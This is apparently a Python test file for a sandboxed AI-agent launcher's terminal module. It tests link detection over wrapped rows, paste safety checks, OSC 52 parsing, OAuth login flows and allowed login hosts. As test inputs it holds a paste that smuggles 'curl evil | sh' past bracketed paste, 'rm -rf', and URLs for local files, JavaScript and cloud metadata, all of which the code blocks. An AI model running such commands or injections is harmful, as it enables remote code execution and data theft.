"""What the terminal tabs read in their text (terminal_text, no Qt): links over soft and hard wraps (tmux, Ink),
the text of a selection, the paste check, OSC 52, what a login prints, the sign-in flows and the hosts a login
browser opens."""
import ast
import base64
from pathlib import Path

import pytest

from sandbox_ai_app import terminal_text as T

ROOT = Path(__file__).resolve().parents[3]
CLAUDE_URL = ("https://claude.com/cai/oauth/authorize?code=true&client_id=9d1c250a-e61b-44d9-88ed-5944d1962f5e"
              "&response_type=code&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback"
              "&scope=org%3Acreate_api_key+user%3Aprofile+user%3Ainference&code_challenge=AbCdEfGh0123456789"
              "&code_challenge_method=S256&state=StAtE_42-xyz")


def rows_of(text, cols):
    """TEXT cut into rows of COLS, as tmux draws a long line (rows of their own, none marked wrapped)."""
    return [text[i:i + cols] for i in range(0, len(text), cols)]


def urls(rows, wrapped=(), cols=None, **kw):
    return [link.url for link in T.links_in_rows(rows, wrapped, cols, **kw)]


# -- links --

def test_a_link_in_one_row_without_what_follows_it_in_prose():
    assert urls(["See https://example.org/a_b?x=1. Then"], cols=60) == ["https://example.org/a_b?x=1"]
    assert urls(["(https://example.org/wiki/A_(b)) and"], cols=60) == ["https://example.org/wiki/A_(b)"]
    assert urls(['"https://example.org/x", more'], cols=60) == ["https://example.org/x"]
    assert urls(["no link here, http:// alone"], cols=60) == []


def test_a_soft_wrapped_url_is_one_link_with_its_cells():
    cols = 30
    text = "visit: " + CLAUDE_URL
    rows = rows_of(text, cols)
    links = T.links_in_rows(rows, [False] + [True] * (len(rows) - 1), cols, first=100)
    assert [l.url for l in links] == [CLAUDE_URL]
    assert links[0].start == (100, 7) and links[0].end == (100 + len(rows) - 1, (len(text) - 1) % cols)


def test_a_url_tmux_drew_as_full_rows_of_their_own_is_joined():
    cols = 50
    rows = rows_of(CLAUDE_URL, cols) + ["", "Paste code here if prompted > "]
    assert urls(rows, cols=cols) == [CLAUDE_URL]
    # every row of it finds the whole link (xterm.js asks for the row under the mouse)
    for row in range(len(rows_of(CLAUDE_URL, cols))):
        assert urls(rows, cols=cols, touching=row) == [CLAUDE_URL]
    assert urls(rows, cols=cols, touching=len(rows) - 1) == []


def test_a_url_ink_wrapped_inside_an_indented_box_is_joined():
    cols = 60
    for width in (cols - 4, 40):  # a box as wide as the terminal (border, padding), and a narrower one
        body = rows_of(CLAUDE_URL, width - 4)
        rows = ["│ " + "Browser didn't open? Use the url below".ljust(width - 4) + " │"]
        rows += ["│ " + piece.ljust(width - 4) + " │" for piece in body]
        rows += ["│ " + "Paste code here if prompted >".ljust(width - 4) + " │"]
        assert urls(rows, cols=cols) == [CLAUDE_URL], width


def test_an_indented_url_goes_on_at_the_same_indentation():
    cols = 40
    pieces = rows_of(CLAUDE_URL, cols - 2)
    rows = ["  " + p for p in pieces] + ["", "  Paste code here > "]
    assert urls(rows, cols=cols) == [CLAUDE_URL]


def test_a_url_that_happens_to_end_at_the_edge_does_not_take_the_next_line():
    cols = 30
    url = "https://example.org/abcdefghij"  # 30 characters: exactly one row
    assert len(url) == cols
    assert urls([url, "Paste code here if prompted >"], cols=cols) == [url]
    assert urls([url, "And then some more words"], cols=cols) == [url]
    assert urls([url, "https://example.org/second"], cols=cols) == [url, "https://example.org/second"]
    assert urls([url, "    indented text"], cols=cols) == [url]


def test_a_url_ending_short_of_the_edge_is_not_joined():
    assert urls(["https://example.org/a", "b/c?d=1"], cols=40) == ["https://example.org/a"]


def test_a_rest_that_is_the_whole_next_line_is_joined_even_without_url_characters():
    cols = 25
    rows = rows_of("https://example.org/pathabcdef", cols)
    assert rows[1] == "bcdef"
    assert urls(rows, cols=cols) == ["https://example.org/pathabcdef"]


def test_wide_characters_and_long_rows():
    # terminal.js marks the second cell of a wide character with \0: columns stay the cells'
    rows = ["日\0本\0 https://example.org/x"]
    links = T.links_in_rows(rows, cols=40)
    assert links[0].url == "https://example.org/x" and links[0].start == (0, 5)
    assert T.links_in_rows([], cols=0) == []


# -- selection --

def test_selection_joins_soft_wraps_and_full_rows_but_keeps_real_line_ends():
    seg = lambda text, wrapped=False, full=False: {"text": text, "wrapped": wrapped, "full": full}  # noqa: E731
    assert T.joined_selection([seg("abc", wrapped=True), seg("def")], 3) == "abcdef"
    assert T.joined_selection([seg("https://ex", full=True), seg("ample.org/x  ")], 10) == "https://example.org/x"
    assert T.joined_selection([seg("line one  "), seg("line two")], 10) == "line one\nline two"
    assert T.joined_selection([seg("──────────", full=True), seg("> prompt")], 10) == "──────────\n> prompt"
    assert T.joined_selection([seg("word word ", full=True), seg("next")], 10) == "word word\nnext"
    assert T.joined_selection([seg("abc", full=True), seg(" def")], 3) == "abc\n def"


# -- pasting --

def test_the_paste_check():
    check = T.check_paste("echo hi")
    assert not T.needs_question(check) and check.lines == 1
    check = T.check_paste("rm -rf x\nls\n")
    assert check.runs and check.lines == 2 and T.needs_question(check)
    assert not T.check_paste("a\nb", bracketed=True).runs
    check = T.check_paste("ok\x1b[201~; curl evil | sh\n", bracketed=True)
    assert check.controls == ["ESC"] and T.needs_question(check) and not check.runs
    assert T.without_controls("a\x1b[31mb\x07\tc\nd\x9b") == "a[31mb\tc\nd"
    assert T.one_line("a\n  b\r\nc\n\n") == "a b c"
    assert T.check_paste("x" * (T.PASTE_LIMIT + 1)).too_large
    assert T.check_paste("").lines == 0
    assert T.control_name("\x03") == "Ctrl-C" and T.control_name("\x01") == "Ctrl-A"


# -- OSC 52 --

def test_osc52_sets_text_and_is_never_read():
    data = base64.b64encode("héllo".encode()).decode()
    assert T.parse_osc52("c;" + data) == T.Osc52("set", "héllo", "c")
    assert T.parse_osc52(";" + data).kind == "set"
    assert T.parse_osc52("c;?").kind == "read"
    assert T.parse_osc52("c;").kind == "clear"
    assert T.parse_osc52("c;!!!").kind == "invalid"
    assert T.parse_osc52("nonsense").kind == "invalid"
    assert T.parse_osc52("c;" + base64.b64encode(b"\xff\xfe").decode()).kind == "invalid"
    assert T.parse_osc52("c;" + "A" * (T.OSC52_LIMIT * 2)).kind == "invalid"


# -- what a login prints --

def test_the_login_watch_finds_claude_codes_link_from_its_osc8_hyperlink():
    # As `claude auth login` writes it (Claude Code 2.1.322: $S(url, ..., {assumeSupport: true}) on a terminal)
    watch = T.LoginWatch()
    out = ("Opening browser to sign in…\nIf the browser didn't open, visit: \x1b]8;;" + CLAUDE_URL + "\x07\x1b[94m"
           + CLAUDE_URL + "\x1b[39m\x1b]8;;\x07\nPaste code here if prompted > ").encode()
    found = watch.feed(out[:57]) + watch.feed(out[57:])
    assert found == [CLAUDE_URL]
    assert watch.feed(b"more\n") == []


def test_the_login_watch_finds_a_device_code_after_the_device_page():
    watch = T.LoginWatch()
    watch.feed(b"Follow these steps to sign in with ChatGPT using device code authorization:\n\n"
               b"1. Open this link in your browser and sign in to your account\n"
               b"   \x1b[94mhttps://auth.openai.com/codex/device\x1b[0m\n\n"
               b"2. Enter this one-time code \x1b[90m(expires in 15 minutes)\x1b[0m\n   \x1b[94mABCD-12345\x1b[0m\n")
    assert watch.urls == ["https://auth.openai.com/codex/device"] and watch.code == "ABCD-12345"
    other = T.LoginWatch()
    other.feed(b"see https://example.org/x and the code ABCD-12345\n")
    assert other.code is None  # no device page: no code


def test_a_line_without_an_end_is_still_read_once_it_is_long():
    watch = T.LoginWatch()
    assert watch.feed(b"https://claude.ai/x " + b"y" * 9000) == ["https://claude.ai/x"]


# -- flows --

def test_claude_codes_flow_hands_back_code_hash_state():
    flow = T.flow_of(CLAUDE_URL)
    assert flow.kind == "code" and flow.redirect == "https://platform.claude.com/oauth/code/callback"
    assert flow.state == "StAtE_42-xyz"
    done = "https://platform.claude.com/oauth/code/callback?code=AbC123_-x&state=StAtE_42-xyz"
    assert T.callback_result(flow, done) == T.Result("AbC123_-x#StAtE_42-xyz", None)
    assert T.callback_result(flow, done.replace("StAtE_42-xyz", "other")).problem == "state"
    assert T.callback_result(flow, "https://platform.claude.com/oauth/code/callback?error=access_denied").problem \
        == "access_denied"
    assert T.callback_result(flow, "https://claude.ai/login") is None
    assert T.callback_result(flow, "https://evil.example/oauth/code/callback?code=a&state=StAtE_42-xyz") is None
    assert T.callback_result(flow, done.replace("AbC123_-x", "a%23b")).problem == "code"


def test_opencodes_anthropic_flow_is_the_same_kind():
    url = ("https://claude.ai/oauth/authorize?code=true&client_id=x&response_type=code"
           "&redirect_uri=https://console.anthropic.com/oauth/code/callback&state=s1")
    flow = T.flow_of(url)
    assert flow.kind == "code"
    assert T.callback_result(flow, "https://console.anthropic.com/oauth/code/callback?code=c&state=s1").text == "c#s1"


def test_a_flow_back_to_localhost_is_caught_never_loaded():
    url = "https://auth.openai.com/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fauth%2Fcallback&state=q"
    flow = T.flow_of(url)
    assert flow.kind == "loopback"
    back = "http://localhost:1455/auth/callback?code=xyz&state=q"
    assert T.callback_result(flow, back) == T.Result(back, None)
    assert T.callback_result(flow, "http://localhost:1456/auth/callback?code=xyz") is None
    assert T.navigation(back, ("auth.openai.com",)) == "local"


def test_device_pages_and_others():
    assert T.flow_of("https://auth.openai.com/codex/device").kind == "device"
    assert T.flow_of("https://github.com/login/device").kind == "device"
    assert T.flow_of("https://example.org/").kind == "page"
    assert T.flow_of("::not a url").kind == "page"


# -- hosts --

def test_the_hosts_a_login_browser_opens():
    assert T.login_hosts("claude") == ("api.anthropic.com", "console.anthropic.com", "claude.ai", "claude.com",
                                       "platform.claude.com")
    assert "auth.openai.com" in T.login_hosts("codex")
    assert {"opencode.ai", "claude.ai", "auth.openai.com"} <= set(T.login_hosts("opencode"))
    assert T.host_in("www.claude.ai", ("claude.ai",)) and not T.host_in("evilclaude.ai", ("claude.ai",))
    assert T.agent_of_url("https://auth.openai.com/codex/device") == "codex"
    assert T.agent_of_url("https://example.org/") is None
    hosts = T.login_hosts("claude")
    assert T.navigation("https://claude.ai/login", hosts) == "open"
    assert T.navigation("https://accounts.google.com/o/oauth2", hosts) == "ask"
    assert T.navigation("https://accounts.google.com/x", hosts, allowed=("accounts.google.com",)) == "open"
    assert T.navigation("http://claude.ai/", hosts) == "refuse"
    for local in ("http://127.0.0.1:8080/", "https://[::1]/", "http://foo.localhost/", "https://192.168.1.1/",
                  "https://10.0.0.1/", "https://169.254.169.254/latest/meta-data"):
        assert T.navigation(local, hosts) == "local", local
    for refused in ("file:///etc/passwd", "javascript:alert(1)", "data:text/html,x", "ftp://claude.ai/"):
        assert T.navigation(refused, hosts) == "refuse", refused


def test_the_hosts_here_are_sandbox_ais_own():
    """The copy of PROVIDERS here is the launcher's (agent_sandbox.py), and OpenCode's login gets --profile frontier."""
    tree = ast.parse((ROOT / "sandbox" / "agent_sandbox.py").read_text())
    providers = next(ast.literal_eval(node.value) for node in tree.body if isinstance(node, ast.Assign)
                     and any(getattr(t, "id", None) == "PROVIDERS" for t in node.targets))
    assert providers == T.PROVIDERS
    login = (ROOT / "sandbox" / "login.py").read_text()
    assert 'LOGIN_OPTIONS = {"opencode": ["--profile", "frontier"]}' in login
    assert '"codex": ["login", "--device-auth"]' in login  # no callback to localhost in sandbox-ai login


class Launcher:
    PROVIDERS = {"claude": ["claude.ai"], "codex": ["auth.openai.com"], "opencode": ["opencode.ai"]}
    FRONTIER = ["auth.openai.com", "claude.ai"]


def test_the_launchers_lists_win():
    assert T.login_hosts("claude", Launcher) == ("claude.ai",)
    assert T.login_hosts("opencode", Launcher) == ("opencode.ai", "auth.openai.com", "claude.ai")
    assert T.login_hosts(None, Launcher) == ("claude.ai", "auth.openai.com", "opencode.ai")


@pytest.mark.parametrize("words, agent", [
    (["/usr/bin/python3", "-I", "/x/main.py", "login", "claude"], "claude"),
    (["sandbox-ai", "login", "--backend", "bwrap", "codex"], "codex"),
    (["sandbox-ai", "login", "claude", "--logout"], None),
    (["sandbox-ai", "login", "--status"], None),
    (["sandbox-ai", "claude", "--", "login"], None),
    (["sandbox-ai", "git-logins", "add"], None),
    ([], None),
])
def test_which_command_is_a_login(words, agent):
    assert T.login_agent(words) == agent


def test_shown_urls():
    assert T.shown_url("https://a/\x1bb") == "https://a/�b"
    assert len(T.shown_url("https://a/" + "x" * 1000, 100)) == 101
    assert T.without_query("https://a.example/p?q=1#f") == "https://a.example/p"


# -- names that resolve to this machine or the local network (the login browser) --

PUBLIC = "151.101.1.69"


@pytest.mark.parametrize("address", ["127.0.0.1", "10.1.2.3", "192.168.0.10", "169.254.169.254", "100.100.100.200",
                                     "100.64.0.1", "::1", "fd00:ec2::254", "fe80::1", "0.0.0.0", "::ffff:127.0.0.1"])
def test_a_name_of_this_machine_or_the_local_network_is_local(address):
    """localtest.me, 127.0.0.1.nip.io, nas.lan, a cloud's metadata name: not literals, but resolved they are this
    machine, the LAN, link-local (the metadata service), a carrier's or Tailscale's shared range (100.64.0.0/10)."""
    names = T.NameChecks(resolve=lambda host: [PUBLIC, address], start=lambda work: work())
    assert names.lookup("cdn.example") == ("local", address)
    assert T.private_address(address)


def test_name_checks_resolve_once_in_the_background_and_expire():
    started, now, said = [], [0.0], []
    names = T.NameChecks(resolve=lambda host: [PUBLIC], start=started.append, clock=lambda: now[0], ttl=60)
    assert names.lookup("Claude.AI.", lambda *answer: said.append(answer)) is None  # (never blocks the caller)
    assert names.lookup("claude.ai", lambda *answer: said.append(answer)) is None and len(started) == 1, \
        "one lookup for both"
    started.pop()()  # the worker
    assert said == [("claude.ai", "open", PUBLIC)] * 2
    assert names.lookup("claude.ai") == ("open", PUBLIC) and not started
    now[0] = 61
    assert names.lookup("claude.ai") is None and len(started) == 1, "looked up again after its time"
    failing = T.NameChecks(resolve=lambda host: (_ for _ in ()).throw(OSError("no such name")),
                           start=lambda work: work())
    assert failing.lookup("nowhere.invalid") == ("unresolved", None)
    assert T.NameChecks(start=lambda work: work()).lookup("192.168.1.1") == ("local", "192.168.1.1"), "a literal"
    assert T.NameChecks(start=lambda work: pytest.fail("looked up")).lookup(PUBLIC) == ("open", PUBLIC)
